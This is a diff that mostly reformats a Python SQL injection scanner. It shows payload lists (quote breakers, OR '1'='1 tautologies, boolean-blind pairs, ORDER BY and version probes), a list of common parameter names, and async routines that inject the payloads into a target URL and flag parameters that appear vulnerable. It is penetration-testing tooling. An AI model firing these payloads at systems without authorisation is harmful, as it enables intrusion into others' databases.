@@ -58,10 +58,17 @@ logger = logging.getLogger("mytools.sqliscan")
 
 
 _ERROR_PAYLOADS_DEFAULT: list[str] = [
-    "'", "\"", "')", "))",
-    "' OR '1'='1", "\" OR \"1\"=\"1",
-    "1' AND 1=1--", "1' AND 1=2--",
-    "') AND ('1'='1", "1' ORDER BY 1--", "1' ORDER BY 100--",
+    "'",
+    '"',
+    "')",
+    "))",
+    "' OR '1'='1",
+    '" OR "1"="1',
+    "1' AND 1=1--",
+    "1' AND 1=2--",
+    "') AND ('1'='1",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 100--",
 ]
 
 _BLIND_BOOLEAN_PAIRS_DEFAULT: list[list[str]] = [
@@ -69,8 +76,7 @@ _BLIND_BOOLEAN_PAIRS_DEFAULT: list[list[str]] = [
     ["' OR 'a'='a'--", "' OR 'a'='b'--"],
     ["1 AND 1=1", "1 AND 1=2"],
     ["' AND 'x'='x'--", "' AND 'x'='y'--"],
-    ["1' AND SUBSTRING(@@version,1,1)='5'--",
-     "1' AND SUBSTRING(@@version,1,1)='X'--"],
+    ["1' AND SUBSTRING(@@version,1,1)='5'--", "1' AND SUBSTRING(@@version,1,1)='X'--"],
 ]
 
 _TIME_PAYLOADS_DEFAULT: list[str] = [
@@ -102,22 +108,43 @@ _BYPASS_PAYLOADS_DEFAULT: list[str] = [
 ]
 
 _INJECTION_PARAMS_DEFAULT: list[str] = [
-    "id", "q", "search", "page", "name", "user", "cat", "item",
-    "product", "order", "sort", "type", "action", "debug", "test",
-    "input", "cmd", "file", "path",
+    "id",
+    "q",
+    "search",
+    "page",
+    "name",
+    "user",
+    "cat",
+    "item",
+    "product",
+    "order",
+    "sort",
+    "type",
+    "action",
+    "debug",
+    "test",
+    "input",
+    "cmd",
+    "file",
+    "path",
 ]
 
 
 def _load_payloads() -> dict[str, object]:
     from mytools.data import load_payloads
-    return load_payloads("web", "sqli", default={
-        "error_payloads": _ERROR_PAYLOADS_DEFAULT,
-        "blind_boolean_pairs": _BLIND_BOOLEAN_PAIRS_DEFAULT,
-        "time_payloads": _TIME_PAYLOADS_DEFAULT,
-        "union_payloads": _UNION_PAYLOADS_DEFAULT,
-        "bypass_payloads": _BYPASS_PAYLOADS_DEFAULT,
-        "injection_params": _INJECTION_PARAMS_DEFAULT,
-    })
+
+    return load_payloads(
+        "web",
+        "sqli",
+        default={
+            "error_payloads": _ERROR_PAYLOADS_DEFAULT,
+            "blind_boolean_pairs": _BLIND_BOOLEAN_PAIRS_DEFAULT,
+            "time_payloads": _TIME_PAYLOADS_DEFAULT,
+            "union_payloads": _UNION_PAYLOADS_DEFAULT,
+            "bypass_payloads": _BYPASS_PAYLOADS_DEFAULT,
+            "injection_params": _INJECTION_PARAMS_DEFAULT,
+        },
+    )
 
 
 def _get_error_payloads() -> list[str]:
@@ -348,7 +375,8 @@ def _make_attempt(
 
 
 async def _test_baseline(
-    client: httpx.AsyncClient, url: str,
+    client: httpx.AsyncClient,
+    url: str,
 ) -> Baseline:
     """Envia requisicao baseline."""
     try:
@@ -397,11 +425,17 @@ async def _test_error(
         for payload in error_payloads:
             result = await _inject(client, url, param, payload)
             if result is None:
-                attempts.append(_make_attempt(
-                    technique="error", category="error",
-                    injection_point=param, url=url, payload=payload,
-                    baseline=baseline, error="Request failed",
-                ))
+                attempts.append(
+                    _make_attempt(
+                        technique="error",
+                        category="error",
+                        injection_point=param,
+                        url=url,
+                        payload=payload,
+                        baseline=baseline,
+                        error="Request failed",
+                    )
+                )
                 continue
 
             status, size, _ = result
@@ -437,13 +471,22 @@ async def _test_error(
                     else:
                         details += f" [2nd-order confirmed: {v_found}]"
 
-            attempts.append(_make_attempt(
-                technique="error", category="error",
-                injection_point=param, url=inject_url, payload=payload,
-                baseline=baseline, status_test=status, size_test=size,
-                db_detected=db, content_match=content_match,
-                vulnerable=vulnerable, details=details,
-            ))
+            attempts.append(
+                _make_attempt(
+                    technique="error",
+                    category="error",
+                    injection_point=param,
+                    url=inject_url,
+                    payload=payload,
+                    baseline=baseline,
+                    status_test=status,
+                    size_test=size,
+                    db_detected=db,
+                    content_match=content_match,
+                    vulnerable=vulnerable,
+                    details=details,
+                )
+            )
 
     return attempts
 
@@ -490,18 +533,24 @@ async def _test_boolean_blind(
             sz = last_true_result[1] if last_true_result else 0
             tm = last_true_result[2] if last_true_result else 0.0
 
-            details = (
-                f"Boolean diff consistente ({repeats}x): {diffs}" if consistent
-                else "Diff inconsistente entre true/false"
-            )
+            details = f"Boolean diff consistente ({repeats}x): {diffs}" if consistent else "Diff inconsistente entre true/false"
 
-            attempts.append(_make_attempt(
-                technique="boolean_blind", category="blind",
-                injection_point=param, url=url, payload=true_payload,
-                baseline=baseline, status_test=st, size_test=sz,
-                time_test=tm, content_match=consistent,
-                vulnerable=consistent, details=details,
-            ))
+            attempts.append(
+                _make_attempt(
+                    technique="boolean_blind",
+                    category="blind",
+                    injection_point=param,
+                    url=url,
+                    payload=true_payload,
+                    baseline=baseline,
+                    status_test=st,
+                    size_test=sz,
+                    time_test=tm,
+                    content_match=consistent,
+                    vulnerable=consistent,
+                    details=details,
+                )
+            )
 
     return attempts
 
@@ -523,11 +572,17 @@ async def _test_time_blind(
         for payload in time_payloads_list:
             result = await _inject(client, url, param, payload)
             if result is None:
-                attempts.append(_make_attempt(
-                    technique="time_blind", category="blind",
-                    injection_point=param, url=url, payload=payload,
-                    baseline=baseline, error="Request failed",
-                ))
+                attempts.append(
+                    _make_attempt(
+                        technique="time_blind",
+                        category="blind",
+                        injection_point=param,
+                        url=url,
+                        payload=payload,
+                        baseline=baseline,
+                        error="Request failed",
+                    )
+                )
                 continue
 
             status, size, elapsed = result
@@ -539,13 +594,22 @@ async def _test_time_blind(
                 else f"Timing: {elapsed:.2f}s vs baseline {b_time:.2f}s (below threshold)"
             )
 
-            attempts.append(_make_attempt(
-                technique="time_blind", category="blind",
-                injection_point=param, url=url, payload=payload,
-                baseline=baseline, status_test=status, size_test=size,
-                time_test=elapsed, timing_match=timing_match,
-                vulnerable=timing_match, details=details,
-            ))
+            attempts.append(
+                _make_attempt(
+                    technique="time_blind",
+                    category="blind",
+                    injection_point=param,
+                    url=url,
+                    payload=payload,
+                    baseline=baseline,
+                    status_test=status,
+                    size_test=size,
+                    time_test=elapsed,
+                    timing_match=timing_match,
+                    vulnerable=timing_match,
+                    details=details,
+                )
+            )
 
     return attempts
 
@@ -570,11 +634,17 @@ async def _test_union(
 
             result = await _inject(client, url, param, payload)
             if result is None:
-                attempts.append(_make_attempt(
-                    technique="union", category="union",
-                    injection_point=param, url=url, payload=payload,
-                    baseline=baseline, error="Request failed",
-                ))
+                attempts.append(
+                    _make_attempt(
+                        technique="union",
+                        category="union",
+                        injection_point=param,
+                        url=url,
+                        payload=payload,
+                        baseline=baseline,
+                        error="Request failed",
+                    )
+                )
                 continue
 
             status, size, _ = result
@@ -589,37 +659,54 @@ async def _test_union(
                 pass
 
             text = body.decode("utf-8", errors="ignore").lower()
-            is_wrong_columns = any(phrase in text for phrase in [
-                "wrong number of columns",
-                "column count doesn't match",
-                "select list has a different number of terms",
-                "the used select statements have a different number of columns",
-                "operands should have",
-            ])
+            is_wrong_columns = any(
+                phrase in text
+                for phrase in [
+                    "wrong number of columns",
+                    "column count doesn't match",
+                    "select list has a different number of terms",
+                    "the used select statements have a different number of columns",
+                    "operands should have",
+                ]
+            )
 
             if is_wrong_columns:
                 wrong_columns_seen = True
-                attempts.append(_make_attempt(
-                    technique="union", category="union",
-                    injection_point=param, url=inject_url, payload=payload,
-                    baseline=baseline, status_test=status, size_test=size,
-                    vulnerable=False, details="Wrong number of columns (precisa mais NULLs)",
-                ))
+                attempts.append(
+                    _make_attempt(
+                        technique="union",
+                        category="union",
+                        injection_point=param,
+                        url=inject_url,
+                        payload=payload,
+                        baseline=baseline,
+                        status_test=status,
+                        size_test=size,
+                        vulnerable=False,
+                        details="Wrong number of columns (precisa mais NULLs)",
+                    )
+                )
             else:
                 size_diff = abs(size - b_size)
                 db = _detect_db_error(body)
                 vulnerable = (size_diff > 200) and bool(db)
-                details = (
-                    f"UNION possivel: {size_diff} bytes diff" if not vulnerable
-                    else f"DB detectado via UNION: {db}"
+                details = f"UNION possivel: {size_diff} bytes diff" if not vulnerable else f"DB detectado via UNION: {db}"
+                attempts.append(
+                    _make_attempt(
+                        technique="union",
+                        category="union",
+                        injection_point=param,
+                        url=inject_url,
+                        payload=payload,
+                        baseline=baseline,
+                        status_test=status,
+                        size_test=size,
+                        db_detected=db,
+                        content_match=bool(db),
+                        vulnerable=vulnerable,
+                        details=details,
+                    )
                 )
-                attempts.append(_make_attempt(
-                    technique="union", category="union",
-                    injection_point=param, url=inject_url, payload=payload,
-                    baseline=baseline, status_test=status, size_test=size,
-                    db_detected=db, content_match=bool(db),
-                    vulnerable=vulnerable, details=details,
-                ))
 
     return attempts
 
@@ -648,29 +735,41 @@ async def _test_bypass(
                 status = resp.status_code
                 size = len(body)
             except httpx.RequestError:
-                attempts.append(_make_attempt(
-                    technique="bypass", category="bypass",
-                    injection_point=param, url=inject_url, payload=payload,
-                    baseline=baseline, error="Request failed",
-                ))
+                attempts.append(
+                    _make_attempt(
+                        technique="bypass",
+                        category="bypass",
+                        injection_point=param,
+                        url=inject_url,
+                        payload=payload,
+                        baseline=baseline,
+                        error="Request failed",
+                    )
+                )
                 continue
 
             db = _detect_db_error(body)
             content_match = bool(db)
             vulnerable = content_match
 
-            details = (
-                f"Bypass DB detectado: {db}" if db
-                else f"Bypass status {status}, Size {size}"
-            )
+            details = f"Bypass DB detectado: {db}" if db else f"Bypass status {status}, Size {size}"
 
-            attempts.append(_make_attempt(
-                technique="bypass", category="bypass",
-                injection_point=param, url=inject_url, payload=payload,
-                baseline=baseline, status_test=status, size_test=size,
-                db_detected=db, content_match=content_match,
-                vulnerable=vulnerable, details=details,
-            ))
+            attempts.append(
+                _make_attempt(
+                    technique="bypass",
+                    category="bypass",
+                    injection_point=param,
+                    url=inject_url,
+                    payload=payload,
+                    baseline=baseline,
+                    status_test=status,
+                    size_test=size,
+                    db_detected=db,
+                    content_match=content_match,
+                    vulnerable=vulnerable,
+                    details=details,
+                )
+            )
 
     return attempts
 
@@ -748,10 +847,17 @@ async def run_scan(
             tasks.append(_limited(_test_error(client, url, params, baseline)))
         if category in ("all", "blind"):
             tasks.append(_limited(_test_boolean_blind(client, url, params, baseline)))
-            tasks.append(_limited(_test_time_blind(
-                client, url, params, baseline,
-                time_threshold=time_threshold,
-            )))
+            tasks.append(
+                _limited(
+                    _test_time_blind(
+                        client,
+                        url,
+                        params,
+                        baseline,
+                        time_threshold=time_threshold,
+                    )
+                )
+            )
         if category in ("all", "union"):
             tasks.append(_limited(_test_union(client, url, params, baseline)))
         if category in ("all", "bypass"):
@@ -865,7 +971,8 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("url", nargs="?", help="URL alvo para teste")
     parser.add_argument(
-        "-c", "--category",
+        "-c",
+        "--category",
         choices=["error", "blind", "union", "bypass", "all"],
         default="all",
         help="Categoria de testes (default: all)",
